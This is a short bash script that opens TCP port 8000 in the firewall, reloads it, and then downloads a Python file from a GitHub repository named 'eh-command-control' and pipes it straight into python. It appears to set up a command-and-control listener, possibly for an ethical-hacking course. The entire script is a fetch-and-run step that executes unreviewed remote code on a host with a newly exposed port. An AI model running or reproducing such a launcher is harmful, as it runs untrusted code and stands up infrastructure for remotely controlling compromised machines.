#!/bin/bash
firewall-cmd --add-port=8000/tcp
firewall-cmd --reload  
curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/week4.py | python
